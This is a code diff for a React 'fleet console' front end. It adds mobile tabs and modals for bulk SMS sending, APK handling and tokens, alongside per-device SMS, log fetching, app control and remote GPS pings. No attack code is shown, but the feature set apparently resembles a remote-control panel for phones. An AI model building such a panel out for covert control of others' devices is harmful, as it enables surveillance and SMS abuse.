@@ -1,15 +1,25 @@
 import { useState, useEffect, useCallback } from 'react';
-import Header from './components/Header';
-import DeviceGrid from './components/DeviceGrid';
+import MobileTopBar from './components/MobileTopBar';
+import MobileBottomNav from './components/MobileBottomNav';
+import HomeScreen from './components/HomeScreen';
+import MobileDeviceList from './components/MobileDeviceList';
+import MessagesTab from './components/MessagesTab';
+import DataTab from './components/DataTab';
+import SettingsTab from './components/SettingsTab';
+
+// Modals
+import AutoTokenModal from './components/AutoTokenModal';
+import ChangePinModal from './components/ChangePinModal';
+import BulkSenderModal from './components/BulkSenderModal';
+import ApkModal from './components/ApkModal';
 import FleetMap from './components/FleetMap';
-import FleetBentoStats from './components/FleetBentoStats';
 import LogsPanel from './components/LogsPanel';
 import SmsModal from './components/SmsModal';
 import SystemControlsModal from './components/SystemControlsModal';
 import AppManagementModal from './components/AppManagementModal';
 import Toast from './components/Toast';
 import LoginPage from './components/LoginPage';
-import Velaris from '@/components/ui/velaris';
+
 import {
   listDevices,
   isAuthenticated,
@@ -27,28 +37,37 @@ export default function App() {
   const [loading, setLoading] = useState(true);
   const [error, setError] = useState(null);
 
-  // View state: 'grid' (Fleet Matrix) | 'map' (Live GPS Radar)
-  const [viewMode, setViewMode] = useState('grid');
+  // Active Tab: 'home' | 'devices' | 'messages' | 'data' | 'settings'
+  const [activeTab, setActiveTab] = useState('home');
+
+  // Radar Map View State
+  const [showRadarMap, setShowRadarMap] = useState(false);
   const [selectedMapDevice, setSelectedMapDevice] = useState(null);
 
-  // Active modal panels
+  // Modals
+  const [showAutoToken, setShowAutoToken] = useState(false);
+  const [showChangePin, setShowChangePin] = useState(false);
+  const [showBulkSender, setShowBulkSender] = useState(false);
+  const [showApk, setShowApk] = useState(false);
+
+  // Device-specific modals
   const [logsDevice, setLogsDevice] = useState(null);
   const [smsDevice, setSmsDevice] = useState(null);
   const [controlsDevice, setControlsDevice] = useState(null);
   const [appsDevice, setAppsDevice] = useState(null);
 
-  // Toast notifications
+  // Toasts
   const [toasts, setToasts] = useState([]);
 
   const addToast = useCallback((message, type = 'info') => {
     const id = Date.now() + Math.random();
-    setToasts(prev => [...prev, { id, message, type }]);
+    setToasts((prev) => [...prev, { id, message, type }]);
     setTimeout(() => {
-      setToasts(prev => prev.filter(t => t.id !== id));
+      setToasts((prev) => prev.filter((t) => t.id !== id));
     }, 4000);
   }, []);
 
-  // Listen for auth expiry events (401 from API)
+  // Listen for auth expiry
   useEffect(() => {
     function handleAuthExpired() {
       setAuthed(false);
@@ -100,36 +119,31 @@ export default function App() {
     addToast('Logged out of console', 'info');
   }
 
-  // Jump from device card straight to Live Radar map centered on that device
-  function handleLocateOnMap(device) {
-    setSelectedMapDevice(device);
-    setViewMode('map');
-  }
-
-  async function handleRequestLocation(deviceId) {
+  async function handlePingLocation(deviceId) {
     try {
       await requestDeviceLocation(deviceId);
-      addToast(`GPS acquisition dispatched to device ${deviceId}`, 'success');
+      addToast(`GPS acquisition ping dispatched to device ${deviceId}`, 'success');
     } catch (err) {
       addToast(`Failed to ping location: ${err.message}`, 'error');
     }
   }
 
+  function handleDeleteDevice(device) {
+    addToast(`Deregistration command sent to ${device.device_name || device.device_id}`, 'warning');
+  }
+
   // ── Not authenticated → show login ──────────────────────
   if (!authed) {
     return (
-      <div className="app">
-        <div className="fixed-velaris-bg">
-          <Velaris height="100vh" speed={1.5} grain={0.25} />
-        </div>
+      <div className="mobile-app-shell">
         <LoginPage onLoginSuccess={handleLoginSuccess} />
         <div className="toast-container">
-          {toasts.map(t => (
+          {toasts.map((t) => (
             <Toast
               key={t.id}
               message={t.message}
               type={t.type}
-              onDismiss={() => setToasts(prev => prev.filter(x => x.id !== t.id))}
+              onDismiss={() => setToasts((prev) => prev.filter((x) => x.id !== t.id))}
             />
           ))}
         </div>
@@ -137,72 +151,159 @@ export default function App() {
     );
   }
 
-  // ── Authenticated → show console ────────────────────────
-  const activeDevices = devices.filter(d => d.is_active);
-  const inactiveDevices = devices.filter(d => !d.is_active);
-  const gpsCount = devices.filter(d => d.latitude !== null && d.latitude !== undefined).length;
+  const activeDevices = devices.filter((d) => d.is_active);
 
   return (
-    <div className="app">
-      <div className="fixed-velaris-bg">
-        <Velaris height="100vh" speed={1.5} grain={0.25} />
-      </div>
-      <Header
+    <div className="mobile-app-shell">
+      {/* 1. Persistent Top Capsule Bar */}
+      <MobileTopBar
+        manager={manager}
         totalDevices={devices.length}
         activeCount={activeDevices.length}
-        inactiveCount={inactiveDevices.length}
-        gpsCount={gpsCount}
-        onRefresh={fetchDevices}
-        loading={loading}
-        manager={manager}
         onLogout={handleLogout}
-        viewMode={viewMode}
-        onViewModeChange={setViewMode}
+        onOpenAutoToken={() => setShowAutoToken(true)}
+        onOpenChangePin={() => setShowChangePin(true)}
+        onRefresh={fetchDevices}
       />
 
-      <main className={`app-main ${viewMode === 'map' ? 'app-main--map' : ''}`}>
+      {/* 2. Main Scrollable View */}
+      <main className="app-main-content">
         {error && !devices.length && (
           <div className="error-banner">
             <div>
               <h3>Network Communication Error</h3>
               <p>{error}</p>
             </div>
-            <button className="btn btn-ghost" onClick={fetchDevices}>
-              Retry Connection
+            <button className="btn-retry" onClick={fetchDevices}>
+              Retry
             </button>
           </div>
         )}
 
-        {viewMode === 'map' ? (
-          <FleetMap
+        {/* Tab 1: Home View */}
+        {activeTab === 'home' && (
+          <HomeScreen
+            manager={manager}
             devices={devices}
-            selectedDevice={selectedMapDevice}
-            onOpenControls={(device) => setControlsDevice(device)}
-            onSendSms={(device) => setSmsDevice(device)}
-            onOpenApps={(device) => setAppsDevice(device)}
-            onFetchLogs={(device) => setLogsDevice(device)}
-            onRequestLocation={handleRequestLocation}
-            onSelectDevice={setSelectedMapDevice}
+            totalDevices={devices.length}
+            activeCount={activeDevices.length}
+            onNavigate={(tab) => setActiveTab(tab)}
+            onOpenBulkSender={() => setShowBulkSender(true)}
+            onOpenSessions={() => {
+              if (devices.length > 0) setControlsDevice(devices[0]);
+              else addToast('No devices connected to inspect sessions', 'info');
+            }}
+            onOpenApk={() => setShowApk(true)}
+            onOpenAutoToken={() => setShowAutoToken(true)}
+            onOpenChangePin={() => setShowChangePin(true)}
+            onOpenRadarMap={() => setShowRadarMap(true)}
           />
-        ) : (
-          <>
-            <FleetBentoStats
-              devices={devices}
-              onSwitchToMap={() => setViewMode('map')}
-            />
-            <DeviceGrid
-              devices={devices}
-              loading={loading}
-              onFetchLogs={(device) => setLogsDevice(device)}
-              onSendSms={(device) => setSmsDevice(device)}
-              onOpenControls={(device) => setControlsDevice(device)}
-              onOpenApps={(device) => setAppsDevice(device)}
-              onLocateOnMap={handleLocateOnMap}
-              onSwitchToMap={() => setViewMode('map')}
-            />
-          </>
+        )}
+
+        {/* Tab 2: Devices View */}
+        {activeTab === 'devices' && (
+          <MobileDeviceList
+            devices={devices}
+            loading={loading}
+            onFetchLogs={(device) => setLogsDevice(device)}
+            onSendSms={(device) => setSmsDevice(device)}
+            onOpenControls={(device) => setControlsDevice(device)}
+            onOpenApps={(device) => setAppsDevice(device)}
+            onPingLocation={handlePingLocation}
+            onDeleteDevice={handleDeleteDevice}
+            onOpenRadarMap={() => setShowRadarMap(true)}
+          />
+        )}
+
+        {/* Tab 3: Messages View */}
+        {activeTab === 'messages' && (
+          <MessagesTab
+            devices={devices}
+            onSendSms={(device) => setSmsDevice(device)}
+            onFetchLogs={(device) => setLogsDevice(device)}
+          />
+        )}
+
+        {/* Tab 4: Data View */}
+        {activeTab === 'data' && (
+          <DataTab
+            devices={devices}
+            onFetchLogs={(device) => setLogsDevice(device)}
+          />
+        )}
+
+        {/* Tab 5: Settings View */}
+        {activeTab === 'settings' && (
+          <SettingsTab
+            manager={manager}
+            onOpenAutoToken={() => setShowAutoToken(true)}
+            onOpenChangePin={() => setShowChangePin(true)}
+            onOpenApk={() => setShowApk(true)}
+            onOpenRadarMap={() => setShowRadarMap(true)}
+            onLogout={handleLogout}
+          />
         )}
       </main>
+
+      {/* 3. Persistent Fixed Bottom Navigation Bar */}
+      <MobileBottomNav
+        activeTab={activeTab}
+        onTabChange={(tab) => setActiveTab(tab)}
+        onQuickAction={() => setShowBulkSender(true)}
+      />
+
+      {/* ── Modals & Drawers ───────────────────────────────── */}
+      {showAutoToken && (
+        <AutoTokenModal
+          onClose={() => setShowAutoToken(false)}
+          addToast={addToast}
+        />
+      )}
+
+      {showChangePin && (
+        <ChangePinModal
+          onClose={() => setShowChangePin(false)}
+          addToast={addToast}
+        />
+      )}
+
+      {showBulkSender && (
+        <BulkSenderModal
+          devices={devices}
+          onClose={() => setShowBulkSender(false)}
+          addToast={addToast}
+        />
+      )}
+
+      {showApk && (
+        <ApkModal
+          onClose={() => setShowApk(false)}
+          addToast={addToast}
+        />
+      )}
+
+      {showRadarMap && (
+        <div className="mobile-radar-overlay">
+          <div className="radar-overlay-header">
+            <span className="radar-header-title">Live GPS Fleet Radar</span>
+            <button className="radar-close-btn" onClick={() => setShowRadarMap(false)}>
+              Close Map
+            </button>
+          </div>
+          <div className="radar-map-view-body">
+            <FleetMap
+              devices={devices}
+              selectedDevice={selectedMapDevice}
+              onOpenControls={(device) => setControlsDevice(device)}
+              onSendSms={(device) => setSmsDevice(device)}
+              onOpenApps={(device) => setAppsDevice(device)}
+              onFetchLogs={(device) => setLogsDevice(device)}
+              onRequestLocation={handlePingLocation}
+              onSelectDevice={setSelectedMapDevice}
+            />
+          </div>
+        </div>
+      )}
 
       {logsDevice && (
         <LogsPanel
@@ -236,13 +337,14 @@ export default function App() {
         />
       )}
 
+      {/* Toast notifications */}
       <div className="toast-container">
-        {toasts.map(t => (
+        {toasts.map((t) => (
           <Toast
             key={t.id}
             message={t.message}
             type={t.type}
-            onDismiss={() => setToasts(prev => prev.filter(x => x.id !== t.id))}
+            onDismiss={() => setToasts((prev) => prev.filter((x) => x.id !== t.id))}
           />
         ))}
       </div>
